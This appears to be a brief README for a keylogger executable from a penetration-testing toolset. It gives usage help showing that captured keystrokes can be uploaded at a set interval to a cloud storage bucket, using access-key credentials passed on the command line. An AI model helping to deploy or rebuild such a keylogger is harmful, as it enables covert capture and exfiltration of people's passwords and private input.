# keylogger

### Usage

不加参数直接运行不上传键盘记录内容，为了防止ak泄露，上传oss功能慎用~

```
> keylogger.exe -h

Usage of keylogger.exe:
  -o string
        format: bucketName:accessKeyId:accessKeySecret:endpoint
  -t int
        Upload interval,default: 60min (default 60)
```


### References
https://github.com/mabangde/pentesttools/blob/master/golang/keylogger.go
